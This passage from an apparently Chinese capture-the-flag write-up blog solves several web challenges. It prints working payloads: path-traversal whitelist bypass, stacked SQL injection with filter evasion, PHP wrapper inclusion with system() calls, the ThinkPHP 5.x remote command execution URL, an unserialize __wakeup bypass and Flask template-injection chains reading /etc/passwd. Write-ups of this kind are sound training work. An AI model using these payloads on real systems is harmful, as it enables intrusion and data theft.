class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                //<span class="title function_ invoke__">mb_substr</span>() 函数返回字符串的一部分，<span class="title function_ invoke__">substr</span>()函数只针对英文字符，分割中文文字使用 <span class="title function_ invoke__">mb_substr</span>()</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//.是拼接符</span><br><span class="line">                //<span class="title function_ invoke__">mb_strpos</span>()返回要查找的字符串在字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下<code>hint.php</code>，提示<code>flag not here, and flag in ffffllllaaaagggg</code></p>
<p>那就只能靠source.php，大概思路应该是传一个用<code>?</code>拼接的字符串，截断后的前部分是列表内的内容，后部分是<code>ffffllllaaaagggg</code>，那就构建<code>hint.php?ffffllllaaaagggg</code>，但是这个作为参数传进去没有flag显示。</p>
<p>看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/120221712">大佬的wp</a>，发现需要用<code>…/</code>尽可能多的返回到顶级目录，即<code>hint.php?/../../../../ffffllllaaaagggg</code>，就能得到flag</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MrTreebook/article/details/123460946">大佬的思路</a>里还把<code>?</code>编码了来绕过第三个判断，但是好像没有必要</p>
<p><code>flag&#123;25e7bce6005c4e0c983fb97297ac6e5a&#125;</code></p>
<h2 id="supersqli-x2F-强网杯（2）"><a href="#supersqli-x2F-强网杯（2）" class="headerlink" title="supersqli&#x2F;强网杯（2）"></a>supersqli&#x2F;强网杯（2）</h2><p>打开看一下源码，提示sqlmap是没有灵魂的</p>
<p>直接上sqlmap，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://61.147.171.105:50519/?inject=1  --dbs --batch</span><br><span class="line">sqlmap -u http://61.147.171.105:50519/?inject=1  -D supersqli --tables --batch</span><br><span class="line">//这里提示 No tables found</span><br></pre></td></tr></table></figure>

<p>那就手工注一下</p>
<p>输入<code>1&#39; or 1=1#</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/nicesa/article/details/106390405">大佬的思路</a>，发现它过滤了下列字符，且使用<code>/i</code>标记大小写不敏感</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>但是可以用<code>;</code>执行多执行多sql语句，采用堆叠查询</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show tables#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `1919810931114514`#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后采用预编译的方式进行绕过过滤select</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;set @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prepare aaa from @sql;EXECUTE aaa;#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</span><br></pre></td></tr></table></figure>

<p>发现使用strstr()过滤了<code>set</code>和<code>prepare</code></p>
<p><code>strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串</code></p>
<p>但是这个可以用大小写绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;;sEt @sql = CONCAT(&#x27;</span>sele<span class="string">&#x27;,&#x27;</span>ct <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="string">&#x27;);prEpare aaa from @sql;EXECUTE aaa;#</span></span><br></pre></td></tr></table></figure>

<p>然后就能得到flag</p>
<p>看了官方的wp，因为题目没有禁用rename和alter，可以把words表改名成其它，把1919810931114514表改成words（因为word是默认查询的表），但是它少了一个id列，可以将flag字段改为id，或者添加id字段。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span></span><br></pre></td></tr></table></figure>

<p>然后查询-1’ or 1&#x3D;1#也能得到flag</p>
<p>另一位大佬的wp使用了关键字<code>handler</code>，也能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30623181/article/details/113428768">handler详解</a></p>
<ul>
<li><p>handler  tbl_name open as yunensec; #指定数据表进行载入并将返回句柄重命名</p>
</li>
<li><p>handler tbl_name read first; #读取指定表&#x2F;句柄的首行数据</p>
</li>
<li><p>handler tbl_name read next; #读取指定表&#x2F;句柄的下一行数据</p>
</li>
<li><p>handler yunensec close; #关闭句柄</p>
</li>
</ul>
<p><code>flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</code></p>
<h2 id="Web-php-include-x2F-CTF（2）"><a href="#Web-php-include-x2F-CTF（2）" class="headerlink" title="Web_php_include&#x2F;CTF（2）"></a>Web_php_include&#x2F;CTF（2）</h2><p>访问，php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看了下<a target="_blank" rel="noopener" href="https://blog.csdn.net/yingyugo/article/details/109783035">大佬的wp</a>，主要是两种伪协议，传php代码或者木马？</p>
<p>1.php:&#x2F;&#x2F;伪协议</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;</a></p>
<p>这里是用php:&#x2F;&#x2F;input协议传php代码</p>
<p>hackbar我这里也不行</p>
<p>bp可以，访问<code>/?page=pHp://input</code>（使用大小写或者双写绕过），抓包，在下面添加</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fl4gisisish3r3.php</span><br><span class="line">index.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>

<p>然后用cat查看fl4gisisish3r3.php，就能得到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl4gisisish3r3.php&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.data:&#x2F;&#x2F;伪协议</p>
<p>需满足<code>allow_url_fopen</code>，<code>allow_url_include</code>同时开启才能使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>

<p>这里不能直接用php，需要使用base64加密后才能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;//base64编码后得到后面的字符</span><br></pre></td></tr></table></figure>

<p>这里需要查看源码才能得到flag</p>
<p>3.借助hello参数</p>
<p>这里要构造hello参数必须先page参数为真才能包含。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?page=http:<span class="comment">//127.0.0.1/?hello=&lt;?system(&quot;ls&quot;)?&gt;</span></span><br><span class="line">/?page=http:<span class="comment">//127.0.0.1/?hello=&lt;?show_source (&quot;fl4gisissh3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p>也能得到flag</p>
<p><code>ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;</code></p>
<h2 id="php-rce（2）"><a href="#php-rce（2）" class="headerlink" title="php_rce（2）"></a>php_rce（2）</h2><p>ThinkPHP 5.X - Remote Command Execution</p>
<p>远程代码执行漏洞，参数名是<code>s</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>

<p>或者通过find命令查找flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name &quot;flag&quot;</span><br><span class="line"></span><br><span class="line">/flag /flag</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;thinkphp5_rce&#125;</code></p>
<h2 id="Web-php-unserialize-x2F-CTF（2）"><a href="#Web-php-unserialize-x2F-CTF（2）" class="headerlink" title="Web_php_unserialize&#x2F;CTF（2）"></a>Web_php_unserialize&#x2F;CTF（2）</h2><p>php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则表达式<code>/[oc]:\d+:/i</code>匹配</p>
<p><code>/.../</code>表示匹配中间的表达式</p>
<p><code>[oc]</code>匹配o或者c</p>
<p><code>:</code></p>
<p><code>\d</code>匹配一个数字字符。等价于 [0-9]。</p>
<p><code>+</code>匹配前面的子表达式一次或多次，多个数字</p>
<p><code>i</code>大小写不敏感</p>
<p>所以参数<code>var</code>需要满足base64解码后不包含<code>o:1</code>，但是可以用<code>o:+4</code></p>
<p>php中类实例化的时候，首先运行wakeup()函数，在序列化时先运行sleep()函数,在反序列化时先运行wakeup()，在脚本结束调用destruct()函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wakeup()有个执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数</span><br><span class="line">只要序列化的中的成员数大于实际成员数，即可绕过wakeup()</span><br></pre></td></tr></table></figure>

<p>public属性被序列化的时候属性值会变成属性名<br>protected属性被序列化的时候属性值会变成\x00*\x00属性名<br>private属性被序列化的时候属性值会变成\x00类名\x00属性名<br>其中：\x00表示空字符，但是还是占用一个字符位置</p>
<p>修改序列化字符串中属性1改为2绕过wakeup()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br><span class="line">O:+<span class="number">4</span>:<span class="string">&quot;Demo&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;Demofile&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这里Demofile左右是有\x00的，但是被编辑器忽略了</p>
<p><img data-src="https://img-blog.csdnimg.cn/6e8c7c7684be4af4b624c9dadc5244cb.png" alt="在这里插入图片描述"></p>
<p>可以在bp里面修改，这里要加00</p>
<p><img data-src="https://img-blog.csdnimg.cn/8b7009e5f1ea4d2494dd66836207574f.png" alt="在这里插入图片描述"></p>
<p>然后base64加密一下用var传参就能得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQo=</span><br></pre></td></tr></table></figure>

<p><code>ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;</code></p>
<h2 id="Web-python-template-injection-x2F-CTF-2"><a href="#Web-python-template-injection-x2F-CTF-2" class="headerlink" title="Web_python_template_injection&#x2F;CTF(2)"></a>Web_python_template_injection&#x2F;CTF(2)</h2><p>完全不会，看看<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬的wp</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">flask模板注入</a></p>
<p>访问<code>/&#123;&#123;config&#125;&#125;</code>查看全局变量</p>
<p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。</p>
<p>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">魔术方法</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<p>寻找可用引用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有一个<code>&lt;type &#39;file&#39;&gt;</code>可以用来文件读取，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;class ‘site._Printer’&gt;</code>可以用来命令执行，例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL /[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br></pre></td></tr></table></figure>

<p>直接查看fl4g文件，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125;</code></p>
<h2 id="web2-x2F-CTF（2"><a href="#web2-x2F-CTF（2" class="headerlink" title="web2&#x2F;CTF（2)"></a>web2&#x2F;CTF（2)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);<span class="comment">//反转字符串</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">      